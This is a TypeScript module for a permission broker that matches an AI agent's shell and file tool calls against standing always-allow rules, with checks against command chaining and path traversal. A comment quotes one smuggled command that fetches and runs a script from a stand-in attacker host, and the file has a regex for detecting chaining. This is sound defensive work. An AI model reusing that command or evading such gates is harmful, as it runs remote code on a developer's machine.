// Standing always-allow rule engine (FR-009a/009b): per-project rules derived
// from an approved action, evaluated in creation order before an item is
// enqueued; revoked rules stop matching immediately. Only low and medium risk
// requests may create rules; the broker enforces that invariant.
import { isAbsolute, posix, resolve, sep } from 'node:path'
import type { PermissionRule, PermissionRuleMatcher } from '@shared/domain'

const PATH_FIELDS = ['file_path', 'path', 'notebook_path'] as const

/**
 * Shell syntax that starts a SECOND command after the one a rule approved.
 *
 * `&&` `||` `;` and a newline sequence commands; `|` pipes into another; a
 * backtick or `$(` substitutes one. Each turns "npm install lodash" into
 * "npm install lodash, and also this other thing I never showed you".
 *
 * Deliberately a blunt refusal rather than a shell parser. Getting quoting
 * exactly right is a parser's job, and being wrong in the permissive direction
 * here executes arbitrary code on the developer's machine. A false positive
 * costs one trip to the inbox; a false negative costs the machine. So a command
 * carrying any of these characters — even harmlessly quoted, as in
 * `echo "a && b"` — does not match a standing rule and is decided by a person.
 */
const CHAINS_ANOTHER_COMMAND = /&&|\|\||[;|`\n\r]|\$\(/

/** The literal directory prefix of a glob (everything before the first wildcard). */
function globBaseDir(glob: string): string {
  const wild = glob.search(/[*?]/)
  const prefix = wild === -1 ? glob : glob.slice(0, wild)
  const cut = Math.max(prefix.lastIndexOf('/'), prefix.lastIndexOf('\\'))
  return cut === -1 ? prefix : prefix.slice(0, cut)
}

/**
 * True when `candidate`'s RESOLVED path is `dir` itself or nested under it.
 * Resolving first collapses `.`/`..`, closing the directory-traversal bypass.
 * Windows paths are case-insensitive, so compare case-folded there — otherwise a
 * rule (or cwd) whose casing differs from the tool's reported path silently
 * fails to match.
 */
function isWithinDir(dir: string, candidate: string): boolean {
  const resolvedDir = resolve(dir).replace(/[/\\]+$/, '')
  const resolvedCandidate = isAbsolute(candidate)
    ? resolve(candidate)
    : resolve(resolvedDir, candidate)
  const fold = (p: string): string => (process.platform === 'win32' ? p.toLowerCase() : p)
  return (
    fold(resolvedCandidate) === fold(resolvedDir) ||
    fold(resolvedCandidate).startsWith(`${fold(resolvedDir)}${sep}`)
  )
}

/** Posix form, lower-cased: `posix.matchesGlob` is separator- and case-sensitive,
 *  while rules and tool inputs mix slash styles and casing on Windows. */
const foldPath = (p: string): string => p.replace(/\\/g, '/').toLowerCase()

/**
 * True when `candidate` matches the glob AND its RESOLVED path stays inside the
 * glob's base directory (directory-traversal-safe via isWithinDir).
 */
function withinGlob(glob: string, candidate: string): boolean {
  const base = globBaseDir(glob)
  if (!base || !isWithinDir(base, candidate)) return false
  const resolvedCandidate = isAbsolute(candidate)
    ? resolve(candidate)
    : resolve(resolve(base), candidate)
  return posix.matchesGlob(foldPath(resolvedCandidate), foldPath(glob))
}

export function pathOf(input: Record<string, unknown>): string | null {
  for (const field of PATH_FIELDS) {
    const value = input[field]
    if (typeof value === 'string' && value.length > 0) return value
  }
  return null
}

/** True when the tool input's path field resolves inside `projectPath` — the
 *  cwd-containment auto-approve for in-folder Read/Write/Edit. */
export function isPathWithinProject(
  projectPath: string,
  input: Record<string, unknown>,
): boolean {
  const path = pathOf(input)
  return path !== null && isWithinDir(projectPath, path)
}

/**
 * Derives the always-allow matcher for a decided Bash command (the only tool the
 * broker ever derives a rule from — see permission-broker `alwaysAllow`): a
 * flag-aware two-token prefix, "git commit -m x" → "git commit", but "rm -rf
 * dist" → "rm" (a flag as word 2 never widens a rule). Folder-access rules are
 * seeded with their `path_glob` matcher directly, so no path derivation is
 * needed here.
 */
export function deriveMatcher(command: string): PermissionRuleMatcher {
  const words = command.trim().split(/\s+/)
  const value = words[1] && !words[1].startsWith('-') ? `${words[0]} ${words[1]}` : words[0]
  return { kind: 'command_prefix', value }
}

export function matchesRule(
  rule: PermissionRule,
  toolName: string,
  input: Record<string, unknown>,
): boolean {
  if (rule.revokedAt !== null) return false
  if (rule.toolName !== toolName) return false
  switch (rule.matcher.kind) {
    case 'tool_only':
      return true
    case 'command_prefix': {
      const command = typeof input.command === 'string' ? input.command.trim() : ''
      const prefix = rule.matcher.value ?? ''
      if (prefix.length === 0) return false
      if (command === prefix) return true
      if (!command.startsWith(`${prefix} `)) return false
      // A prefix match approves ONE command, and a shell will happily chain more
      // onto it ("npm install lodash && curl evil.sh | sh" still starts with the
      // same eleven characters). Nothing downstream re-checks this — the
      // dangerous-command check runs only when a rule is created, never when one
      // is matched — so this is the only gate. Refusing (not denying) a chained
      // command just fails the match, sending it to the inbox for a person.
      return !CHAINS_ANOTHER_COMMAND.test(command.slice(prefix.length))
    }
    case 'path_glob': {
      const path = pathOf(input)
      if (!path || !rule.matcher.value) return false
      return withinGlob(rule.matcher.value, path)
    }
  }
}

/** First active match approves (evaluation order is creation order). */
export function evaluateStandingRules(
  rules: PermissionRule[],
  toolName: string,
  input: Record<string, unknown>,
): PermissionRule | null {
  return rules.find((rule) => matchesRule(rule, toolName, input)) ?? null
}
